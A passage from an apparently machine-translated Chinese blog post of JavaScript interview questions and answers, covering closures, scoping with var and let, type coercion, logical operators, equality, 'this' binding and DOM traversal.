class="line">&#125;);</span><br></pre></td></tr></table></figure><p>最后，最简单的解决方案，如果你在ES6 / ES2015上下文中，就是使用let i而不是var i：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> btn = <span class="built_in">document</span>.createElement(<span class="string">'button'</span>);</span><br><span class="line">  btn.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">'Button '</span> + i));</span><br><span class="line">  btn.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="built_in">console</span>.log(i); &#125;);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(btn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="假设d是范围内的“空”对象"><a href="#假设d是范围内的“空”对象" class="headerlink" title="假设d是范围内的“空”对象"></a>假设d是范围内的“空”对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d = &#123;&#125;;</span><br></pre></td></tr></table></figure><p>使用下面的代码完成了什么？使用下面的代码完成了什么？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ <span class="string">'zebra'</span>, <span class="string">'horse'</span> ].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    d[k] = <span class="literal">undefined</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面显示的代码片段在对象d上设置了两个属性。理想情况下，对具有未设置键的JavaScript对象执行的查找评估为未定义。但是运行这段代码会将这些属性标记为对象的“自己的属性”。</p><p>这是确保对象具有一组给定属性的有用策略。将该对象传递给Object.keys将返回一个包含这些设置键的数组（即使它们的值未定义）。</p><h2 id="下面的代码将输出到控制台，为什么"><a href="#下面的代码将输出到控制台，为什么" class="headerlink" title="下面的代码将输出到控制台，为什么"></a>下面的代码将输出到控制台，为什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = <span class="string">"john"</span>.split(<span class="string">''</span>);</span><br><span class="line"><span class="keyword">var</span> arr2 = arr1.reverse();</span><br><span class="line"><span class="keyword">var</span> arr3 = <span class="string">"jones"</span>.split(<span class="string">''</span>);</span><br><span class="line">arr2.push(arr3);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"array 1: length="</span> + arr1.length + <span class="string">" last="</span> + arr1.slice(<span class="number">-1</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"array 2: length="</span> + arr2.length + <span class="string">" last="</span> + arr2.slice(<span class="number">-1</span>));</span><br></pre></td></tr></table></figure><p>记录的输出将是：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"array 1: length=5 last=j,o,n,e,s"</span></span><br><span class="line"><span class="string">"array 2: length=5 last=j,o,n,e,s"</span></span><br></pre></td></tr></table></figure><p>arr1和arr2是相同的（即[‘n’，’h’，’o’，’j’，[‘j’，’o’，’n’，’e’，’s’]]）上述代码由于以下原因而被执行：</p><p>调用数组对象的reverse（）方法不仅以相反的顺序返回数组，它还颠倒了数组本身的顺序（即在这种情况下，arr1）。</p><p>reverse（）方法返回对数组本身的引用（即，在这种情况下为arr1）。因此，arr2仅仅是对arr1的引用（而不是副本）。因此，当对arr2做任何事情时（即，当我们调用arr2.push（arr3）;）时，arr1也会受到影响，因为arr1和arr2只是对同一个对象的引用。</p><p>这里有几个观点可以让人们回答这个问题：</p><p>将数组传递给另一个数组的push（）方法会将整个数组作为单个元素推入数组的末尾。结果，声明arr2.push（arr3）;将arr3作为一个整体添加到arr2的末尾（即，它不连接两个数组，这就是concat（）方法的用途）。</p><p>像Python一样，JavaScript在调用像slice（）这样的数组方法时，会承认负面下标，以此作为在数组末尾引用元素的方式;例如，下标-1表示数组中的最后一个元素，依此类推。</p><h2 id="下面的代码输出到控制台，为什么"><a href="#下面的代码输出到控制台，为什么" class="headerlink" title="下面的代码输出到控制台，为什么"></a>下面的代码输出到控制台，为什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span> +  <span class="string">"2"</span> + <span class="string">"2"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span> +  +<span class="string">"2"</span> + <span class="string">"2"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span> +  -<span class="string">"1"</span> + <span class="string">"2"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(+<span class="string">"1"</span> +  <span class="string">"1"</span> + <span class="string">"2"</span>);</span><br><span class="line"><span class="built_in">console</span>.log( <span class="string">"A"</span> - <span class="string">"B"</span> + <span class="string">"2"</span>);</span><br><span class="line"><span class="built_in">console</span>.log( <span class="string">"A"</span> - <span class="string">"B"</span> + <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>以上代码将输出到控制台：</p><p>“122”<br>“32”<br>“02”<br>“112”<br>“NaN2”<br>NaN</p><p>这是为什么…</p><p>这里的基本问题是JavaScript（ECMAScript）是一种松散类型的语言，它对值执行自动类型转换以适应正在执行的操作。让我们来看看这是如何与上面的每个例子进行比较。</p><p>示例1：1 +“2”+“2”输出：“122”说明：第一个操作在1 +“2”中执行。由于其中一个操作数（“2”）是一个字符串，所以JavaScript假定需要执行字符串连接，因此将1的类型转换为“1”，1 +“2”转换为“12”。然后，“12”+“2”产生“122”。</p><p>示例2：1 + +“2”+“2”输出：“32”说明：根据操作顺序，要执行的第一个操作是+“2”（第一个“2”之前的额外+被视为一个一元运算符）。因此，JavaScript将“2”的类型转换为数字，然后将一元+符号应用于它（即将其视为正数）。结果，下一个操作现在是1 + 2，当然这会产生3.但是，我们有一个数字和一个字符串之间的操作（即3和“2”），所以JavaScript再次转换数值赋给一个字符串并执行字符串连接，产生“32”。</p><p>示例3：1 + - “1”+“2”输出：“02”说明：这里的解释与前面的示例相同，只是一元运算符是 - 而不是+。因此，“1”变为1，然后在应用 - 时将其变为-1，然后将其加1到产生0，然后转换为字符串并与最终的“2”操作数连接，产生“02”。</p><p>示例4：+“1”+“1”+“2”输出：“112”说明：尽管第一个“1”操作数是基于其前面的一元+运算符的数值类型转换的，当它与第二个“1”操作数连接在一起时返回一个字符串，然后与最终的“2”操作数连接，产生字符串“112”。</p><p>示例5：“A” - “B”+“2”输出：“NaN2”说明：由于 - 运算符不能应用于字符串，并且既不能将“A”也不能将“B”转换为数值， “ - ”B“产生NaN，然后​​与字符串”2“串联产生”NaN2“。</p><p>例6：“A” - “B”+2输出：NaN说明：在前面的例子中，“A” - “B”产生NaN。但是任何运算符应用于NaN和其他数字操作数仍然会产生NaN。</p><h2 id="如果数组列表太大，以下递归代码将导致堆栈溢出。你如何解决这个问题，仍然保留递归模式"><a href="#如果数组列表太大，以下递归代码将导致堆栈溢出。你如何解决这个问题，仍然保留递归模式" class="headerlink" title="如果数组列表太大，以下递归代码将导致堆栈溢出。你如何解决这个问题，仍然保留递归模式"></a>如果数组列表太大，以下递归代码将导致堆栈溢出。你如何解决这个问题，仍然保留递归模式</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> list = readHugeList();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> nextListItem = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> item = list.pop();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (item) &#123;</span><br><span class="line">        <span class="comment">// process the list item...</span></span><br><span class="line">        nextListItem();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过修改nextListItem函数可以避免潜在的堆栈溢出，如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> list = readHugeList();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> nextListItem = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> item = list.pop();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (item) &#123;</span><br><span class="line">        <span class="comment">// process the list item...</span></span><br><span class="line">        setTimeout( nextListItem, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>堆栈溢出被消除，因为事件循环处理递归，而不是调用堆栈。当nextListItem运行时，如果item不为null，则将超时函数（nextListItem）推送到事件队列，并且函数退出，从而使调用堆栈清零。当事件队列运行超时事件时，将处理下一个项目，并设置一个计时器以再次调用nextListItem。因此，该方法从头到尾不经过直接递归调用即可处理，因此调用堆栈保持清晰，无论迭代次数如何。</p><h2 id="什么是JavaScript中的“闭包”？举一个例子"><a href="#什么是JavaScript中的“闭包”？举一个例子" class="headerlink" title="什么是JavaScript中的“闭包”？举一个例子"></a>什么是JavaScript中的“闭包”？举一个例子</h2><p>闭包是一个内部函数，它可以访问外部（封闭）函数的作用域链中的变量。闭包可以访问三个范围内的变量;具体来说：（1）变量在其自己的范围内，（2）封闭函数范围内的变量，以及（3）全局变量。</p><p>这里是一个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> globalVar = <span class="string">"xyz"</span>;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">outerFunc</span>(<span class="params">outerArg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> outerVar = <span class="string">'a'</span>;</span><br><span class="line"></span><br><span class="line">    (<span class="function"><span class="keyword">function</span> <span class="title">innerFunc</span>(<span class="params">innerArg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> innerVar = <span class="string">'b'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(</span><br><span class="line">        <span class="string">"outerArg = "</span> + outerArg + <span class="string">"\n"</span> +</span><br><span class="line">        <span class="string">"innerArg = "</span> + innerArg + <span class="string">"\n"</span> +</span><br><span class="line">        <span class="string">"outerVar = "</span> + outerVar + <span class="string">"\n"</span> +</span><br><span class="line">        <span class="string">"innerVar = "</span> + innerVar + <span class="string">"\n"</span> +</span><br><span class="line">        <span class="string">"globalVar = "</span> + globalVar);</span><br><span class="line"></span><br><span class="line">    &#125;)(<span class="number">456</span>);</span><br><span class="line">&#125;)(<span class="number">123</span>);</span><br></pre></td></tr></table></figure><p>在上面的例子中，innerFunc，outerFunc和全局名称空间的变量都在innerFunc的范围内。上面的代码将产生以下输出：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">outerArg = <span class="number">123</span></span><br><span class="line">innerArg = <span class="number">456</span></span><br><span class="line">outerVar = a</span><br><span class="line">innerVar = b</span><br><span class="line">globalVar = xyz</span><br></pre></td></tr></table></figure><h2 id="以下代码的输出是什么"><a href="#以下代码的输出是什么" class="headerlink" title="以下代码的输出是什么"></a>以下代码的输出是什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(i); &#125;, i * <span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释你的答案。如何在这里使用闭包？</p><p>显示的代码示例不会显示值0,1,2,3和4，这可能是预期的;而是显示5,5,5,5。</p><p>这是因为循环内执行的每个函数将在整个循环完成后执行，因此所有函数都会引用存储在i中的最后一个值，即5。</p><p>通过为每次迭代创建一个唯一的作用域 ，可以使用闭包来防止这个问题，并将该变量的每个唯一值存储在其作用域中，如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(x); &#125;, x * <span class="number">1000</span> );</span><br><span class="line">    &#125;)(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这会产生将0,1,2,3和4记录到控制台的可能结果。</p><p>在ES2015上下文中，您可以在原始代码中简单地使用let而不是var：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(i); &#125;, i * <span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="以下几行代码输出到控制台"><a href="#以下几行代码输出到控制台" class="headerlink" title="以下几行代码输出到控制台"></a>以下几行代码输出到控制台</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"0 || 1 = "</span>+(<span class="number">0</span> || <span class="number">1</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"1 || 2 = "</span>+(<span class="number">1</span> || <span class="number">2</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"0 &amp;&amp; 1 = "</span>+(<span class="number">0</span> &amp;&amp; <span class="number">1</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"1 &amp;&amp; 2 = "</span>+(<span class="number">1</span> &amp;&amp; <span class="number">2</span>));</span><br></pre></td></tr></table></figure><p>解释你的答案。</p><p>该代码将输出以下四行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> || <span class="number">1</span> = <span class="number">1</span></span><br><span class="line"><span class="number">1</span> || <span class="number">2</span> = <span class="number">1</span></span><br><span class="line"><span class="number">0</span> &amp;&amp; <span class="number">1</span> = <span class="number">0</span></span><br><span class="line"><span class="number">1</span> &amp;&amp; <span class="number">2</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure><p>在JavaScript中，都是||和&amp;&amp;是逻辑运算符，当从左向右计算时返回第一个完全确定的“逻辑值”。</p><p>或（||）运算符。在形式为X || Y的表达式中，首先计算X并将其解释为布尔值。如果此布尔值为真，则返回true（1），并且不计算Y，因为“或”条件已经满足。但是，如果此布尔值为“假”，我们仍然不知道X || Y是真还是假，直到我们评估Y，并将其解释为布尔值。</p><p>因此，0 || 1评估为真（1），正如1 || 2。</p><p>和（&amp;&amp;）运算符。在X &amp;&amp; Y形式的表达式中，首先评估X并将其解释为布尔值。如果此布尔值为false，则返回false（0）并且不评估Y，因为“and”条件已失败。但是，如果这个布尔值为“真”，我们仍然不知道X &amp;&amp; Y是真还是假，直到我们评估Y，并将其解释为布尔值。</p><p>然而，&amp;&amp;运算符的有趣之处在于，当表达式评估为“真”时，则返回表达式本身。这很好，因为它在逻辑表达式中被视为“真”，但也可以用于在您关心时返回该值。这解释了为什么，有点令人惊讶的是，1 &amp;&amp; 2返回2（而你可能会期望它返回true或1）。</p><h2 id="下面的代码执行时输出是什么？说明"><a href="#下面的代码执行时输出是什么？说明" class="headerlink" title="下面的代码执行时输出是什么？说明"></a>下面的代码执行时输出是什么？说明</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="literal">false</span> == <span class="string">'0'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">false</span> === <span class="string">'0'</span>)</span><br></pre></td></tr></table></figure><p>该代码将输出：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure><p>在JavaScript中，有两套相等运算符。三重相等运算符===的行为与任何传统的相等运算符相同：如果两侧的两个表达式具有相同的类型和相同的值，则计算结果为true。然而，双等号运算符在比较它们之前试图强制这些值。因此，通常使用===而不是==。对于！== vs！=也是如此。</p><h2 id="以下代码的输出是什么？解释你的答案"><a href="#以下代码的输出是什么？解释你的答案" class="headerlink" title="以下代码的输出是什么？解释你的答案"></a>以下代码的输出是什么？解释你的答案</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=&#123;&#125;,</span><br><span class="line">    b=&#123;<span class="attr">key</span>:<span class="string">'b'</span>&#125;,</span><br><span class="line">    c=&#123;<span class="attr">key</span>:<span class="string">'c'</span>&#125;;</span><br><span class="line"></span><br><span class="line">a[b]=<span class="number">123</span>;</span><br><span class="line">a[c]=<span class="number">456</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a[b]);</span><br></pre></td></tr></table></figure><p>此代码的输出将是456（不是123）。</p><p>原因如下：设置对象属性时，JavaScript会隐式地将参数值串联起来。在这种情况下，由于b和c都是对象，它们都将被转换为“[object Object]”。因此，a [b]和a [c]都等价于[“[object Object]”]，并且可以互换使用。因此，设置或引用[c]与设置或引用[b]完全相同。</p><h2 id="以下代码将输出到控制台中"><a href="#以下代码将输出到控制台中" class="headerlink" title="以下代码将输出到控制台中"></a>以下代码将输出到控制台中</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log((<span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n</span>)</span>&#123;<span class="keyword">return</span> ((n &gt; <span class="number">1</span>) ? n * f(n<span class="number">-1</span>) : n)&#125;)(<span class="number">10</span>));</span><br></pre></td></tr></table></figure><p>该代码将输出10阶乘的值（即10！或3,628,800）。</p><p>原因如下：</p><p>命名函数f（）以递归方式调用自身，直到它调用f（1），它简单地返回1.因此，这就是它的作用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f(<span class="number">1</span>): returns n, which is <span class="number">1</span></span><br><span class="line">f(<span class="number">2</span>): returns <span class="number">2</span> * f(<span class="number">1</span>), which is <span class="number">2</span></span><br><span class="line">f(<span class="number">3</span>): returns <span class="number">3</span> * f(<span class="number">2</span>), which is <span class="number">6</span></span><br><span class="line">f(<span class="number">4</span>): returns <span class="number">4</span> * f(<span class="number">3</span>), which is <span class="number">24</span></span><br><span class="line">f(<span class="number">5</span>): returns <span class="number">5</span> * f(<span class="number">4</span>), which is <span class="number">120</span></span><br><span class="line">f(<span class="number">6</span>): returns <span class="number">6</span> * f(<span class="number">5</span>), which is <span class="number">720</span></span><br><span class="line">f(<span class="number">7</span>): returns <span class="number">7</span> * f(<span class="number">6</span>), which is <span class="number">5040</span></span><br><span class="line">f(<span class="number">8</span>): returns <span class="number">8</span> * f(<span class="number">7</span>), which is <span class="number">40320</span></span><br><span class="line">f(<span class="number">9</span>): returns <span class="number">9</span> * f(<span class="number">8</span>), which is <span class="number">362880</span></span><br><span class="line">f(<span class="number">10</span>): returns <span class="number">10</span> * f(<span class="number">9</span>), which is <span class="number">3628800</span></span><br></pre></td></tr></table></figure><h2 id="考虑下面的代码片段。控制台的输出是什么，为什么"><a href="#考虑下面的代码片段。控制台的输出是什么，为什么" class="headerlink" title="考虑下面的代码片段。控制台的输出是什么，为什么"></a>考虑下面的代码片段。控制台的输出是什么，为什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(x);</span><br><span class="line">    &#125;)(<span class="number">2</span>)</span><br><span class="line">&#125;)(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>输出将为1，即使x的值从未在内部函数中设置。原因如下：</p><p>正如我们的JavaScript招聘指南中所解释的，闭包是一个函数，以及创建闭包时在范围内的所有变量或函数。在JavaScript中，闭包被实现为“内部函数”;即在另一功能的主体内定义的功能。闭包的一个重要特征是内部函数仍然可以访问外部函数的变量。</p><p>因此，在这个例子中，因为x没有在内部函数中定义，所以在外部函数的作用域中搜索一个定义的变量x，该变量的值为1。</p><h2 id="以下代码将输出到控制台以及为什么"><a href="#以下代码将输出到控制台以及为什么" class="headerlink" title="以下代码将输出到控制台以及为什么"></a>以下代码将输出到控制台以及为什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hero = &#123;</span><br><span class="line">    _name: <span class="string">'John Doe'</span>,</span><br><span class="line">    getSecretIdentity: <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>._name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stoleSecretIdentity = hero.getSecretIdentity;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(stoleSecretIdentity());</span><br><span class="line"><span class="built_in">console</span>.log(hero.getSecretIdentity());</span><br></pre></td></tr></table></figure><p>这段代码有什么问题，以及如何解决这个问题。</p><p>该代码将输出：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">undefined</span></span><br><span class="line">John Doe</span><br></pre></td></tr></table></figure><p>第一个console.log打印未定义，因为我们从hero对象中提取方法，所以stoleSecretIdentity（）在_name属性不存在的全局上下文（即窗口对象）中被调用。</p><p>修复stoleSecretIdentity（）函数的一种方法如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> stoleSecretIdentity = hero.getSecretIdentity.bind(hero);</span><br></pre></td></tr></table></figure><h2 id="创建一个函数，给定页面上的DOM元素，将访问元素本身及其所有后代（不仅仅是它的直接子元素）。对于每个访问的元素，函数应该将该元素传递给提供的回调函数"><a href="#创建一个函数，给定页面上的DOM元素，将访问元素本身及其所有后代（不仅仅是它的直接子元素）。对于每个访问的元素，函数应该将该元素传递给提供的回调函数" class="headerlink" title="创建一个函数，给定页面上的DOM元素，将访问元素本身及其所有后代（不仅仅是它的直接子元素）。对于每个访问的元素，函数应该将该元素传递给提供的回调函数"></a>创建一个函数，给定页面上的DOM元素，将访问元素本身及其所有后代（不仅仅是它的直接子元素）。对于每个访问的元素，函数应该将该元素传递给提供的回调函数</h2><p>该函数的参数应该是：</p><ul><li>一个 DOM 元素</li><li>一个回调函数（以DOM元素作为参数）</li></ul><p>访问树中的所有元素（DOM）是[经典的深度优先搜索算法]Depth-First-Search algorithm应用程序。以下是一个示例解决方案：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Traverse</span>(<span class="params">p_element,p_callback</span>) </span>&#123;</span><br><span class="line">   p_callback(p_element);</span><br><span class="line">   <span class="keyword">var</span> list = p_element.children;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</span><br><span class="line">       Traverse(list[i],p_callback);  <span class="comment">// recursive call</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在JavaScript中测试您的这些知识：以下代码的输出是什么"><a href="#在JavaScript中测试您的这些知识：以下代码的输出是什么" class="headerlink" title="在JavaScript中测试您的这些知识：以下代码的输出是什么"></a>在JavaScript中测试您的这些知识：以下代码的输出是什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> length = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  length: <span class="number">5</span>,</span><br><span class="line">  method: <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    fn();</span><br><span class="line">    <span class="built_in">arguments</span>[<span class="number">0</span>]();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.method(fn, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>为什么不是10和5？</p><p>首先，由于fn作为函数方法的参数传递，函数fn的作用域（this）是窗口。 var length = 10;在窗口级别声明。它也可以作为window.length或length或this.length来访问（当这个===窗口时）。</p><p>方法绑定到Object obj，obj.method用参数fn和1调用。虽然方法只接受一个参数，但调用它时已经传递了两个参数;第一个是函数回调，其他只是一个数字。</p><p>当在内部方法中调用fn（）时，该函数在全局级别作为参数传递，this.length将有权访问在Object obj中定义的var length = 10（全局声明）而不是length = 5。</p><p>现在，我们知道我们可以使用arguments []数组访问JavaScript函数中的任意数量的参数。</p><p>因此arguments0只不过是调用fn（）。在fn里面，这个函数的作用域成为参数数组，并且记录参数[]的长度将返回2。</p><p>因此输出将如上所述。</p><h2 id="考虑下面的代码。输出是什么，为什么"><a href="#考虑下面的代码。输出是什么，为什么" class="headerlink" title="考虑下面的代码。输出是什么，为什么"></a>考虑下面的代码。输出是什么，为什么</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span 